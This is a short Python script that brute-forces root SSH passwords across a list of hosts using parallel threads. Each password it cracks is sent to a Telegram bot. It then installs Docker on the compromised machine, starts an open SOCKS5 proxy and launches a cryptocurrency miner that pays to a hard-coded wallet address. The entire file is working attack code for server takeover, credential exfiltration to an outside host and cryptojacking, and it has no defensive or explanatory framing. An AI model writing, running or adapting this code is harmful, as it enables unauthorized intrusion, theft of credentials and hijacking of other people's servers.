# multi threaded ssh bruteforce

import paramiko
import threading
import sys
import time
import requests


token = 'tok'
chat_id = 'id'



passwords = []

for passw in open('passwords.txt'):
    passw = passw.strip()
    passwords.append(passw)

def send_good_to_telegram(host, password):
    url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + f'&text=🖥IP:{host}\n🔑 Password: {password}\n👤 User: root\n🔥Proxy: sshbf:sshbf:{host}:1080\n 🚀Miner: yescrypt.mine.zergpool.com:6233 0x29D06CEe2758fd357a6c7eE1f159ac29c441A579'
    requests.get(url)

# split array into many arrays
def split_array(array, parts):
    length = len(array)
    return [array[i*length // parts: (i+1)*length // parts] for i in range(parts)]

# set the default values
def brute(host, passwordsed):
    for password in passwordsed:
        password = password.strip()
        print('[-] Trying: ' + password + ' on ' + host)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, username='root', password=password, timeout=5)
        except paramiko.AuthenticationException:
            print(f'[!] Password Incorrect: {host} ' + password)
        except Exception:
            break
        else:
            print(f'[+] Password Found: {host} ' + password)
            open('found.txt', 'a').write(host + ' ' + password + ' root'+'\n')
            send_good_to_telegram(host, password)
            ssh.exec_command('apt install docker.io -y')
            ssh.exec_command('docker run -d -p 1080:1080 -e PROXY_USER=sshbf -e PROXY_PASSWORD=sshbf -e PROXY_SERVER=0.0.0.0:1080 xkuma/socks5 > /dev/null 2>&1 &')
            ssh.exec_command('docker run --rm wernight/cpuminer-multi:alpine cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zergpool.com:6233 -u 0x29D06CEe2758fd357a6c7eE1f159ac29c441A579 --timeout 120 -p c=BNB,ID=bobnet > /dev/null 2>&1 &')
            print(f'[+] Miner Started on {host} via {password}')
            ssh.close()
            break

for host in open('hosts.txt'):
    for array in split_array(passwords, 10):
        host = host.strip()
        t = threading.Thread(target=brute, args=(host,array))
        t.start()



